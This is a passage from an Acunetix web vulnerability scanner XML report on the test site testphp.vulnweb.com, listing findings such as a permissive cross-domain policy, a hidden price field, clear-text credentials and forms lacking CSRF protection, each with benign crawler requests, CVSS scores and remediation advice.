       <Recommendation><![CDATA[Carefully evaluate which sites will be allowed to make cross-domain calls. Consider network topology and any authentication mechanisms that will be affected by the configuration or implementation of the cross-domain policy.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /crossdomain.xml HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:52 GMT
Content-Type: text/xml
Content-Length: 224
Last-Modified: Tue, 11 Sep 2012 10:30:22 GMT
Connection: keep-alive
ETag: &quot;504f12be-e0&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="284"><![CDATA[CWE-284]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]]></Descriptor>
          <Score><![CDATA[6.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Cross-domain policy file usage recommendations for Flash Player]]></Database>
          <URL><![CDATA[http://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross-domain policy files]]></Database>
          <URL><![CDATA[http://blogs.adobe.com/stateofsecurity/2007/07/crossdomain_policy_files_1.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="9" color="blue">
       <Name><![CDATA[Hidden form input named price was found]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">f_addcart</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/cart.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>price [Hidden]</li><li>addcart [Hidden]</li></ul>]]></Details>
       <Affects><![CDATA[/product.php (68db51598a6b1e726aa518e093bbd4ff)]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[User may change price information before submitting the form.]]></Impact>
       <Description><![CDATA[A hidden form input named price was found. It's not recommended to hide sensitive information in hidden form fields.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if the script inputs are properly validated.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /product.php?pic=2 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/search.php
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:53 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5507
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="10" color="orange">
       <Name><![CDATA[User credentials are sent in clear text]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">form1</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/secured/newuser.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uuname [Text]</li><li>upass [Password]</li><li>upass2 [Password]</li><li>urname [Text]</li><li>ucc [Text]</li><li>uemail [Text]</li><li>uphone [Text]</li><li>uaddress [TextArea]</li><li>signup [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[A third party may be able to read the user credentials by intercepting an unencrypted HTTP connection.]]></Impact>
       <Description><![CDATA[User credentials are transmitted over an unencrypted channel. This information should always be transferred via an encrypted channel (HTTPS) to avoid being intercepted by malicious users.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Because user credentials are considered sensitive information, should always be transferred to the server over an encrypted connection (HTTPS).]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:56 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="310"><![CDATA[CWE-310]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:W/RC:C]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[High]]></E>
          <Edesc><![CDATA[Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available.]]></Edesc>
          <RL><![CDATA[Workaround]]></RL>
          <RLdesc><![CDATA[There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.]]></RLdesc>
          <RC><![CDATA[Confirmed]]></RC>
          <RCdesc><![CDATA[The vulnerability has been acknowledged by the vendor or author of the affected technology.]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[9.1]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="11" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">form1</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/secured/newuser.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uuname [Text]</li><li>upass [Password]</li><li>upass2 [Password]</li><li>urname [Text]</li><li>ucc [Text]</li><li>uemail [Text]</li><li>uphone [Text]</li><li>uaddress [TextArea]</li><li>signup [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[form1]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:56 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="12" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">fComment</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/comment.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>name [Text]</li><li>comment [TextArea]</li><li>Submit [Submit]</li><li>phpaction [Hidden]</li></ul>]]></Details>
       <Affects><![CDATA[/comment.php (1c5c505530b26c709422c7cf9a33ea84)]]></Affects>
       <Parameter><![CDATA[fComment]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /comment.php?aid=3 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/artists.php
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:57 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 1252
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[Required]]></UI>
          <UIdesc><![CDATA[Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="13" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">&lt;empty&gt;</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/hpp/params.php?p=valid&amp;pp=12</font><br/>Form method: <font color="navy">GET</font><br/><br/>Form inputs:<br/><ul><li>aaaa [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/hpp (fbc1d56ba0737d3fa577aa5a19c9fd49)]]></Affects>
       <Parameter><![CDATA[Unnamed Form]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/?pp=12 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/hpp/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
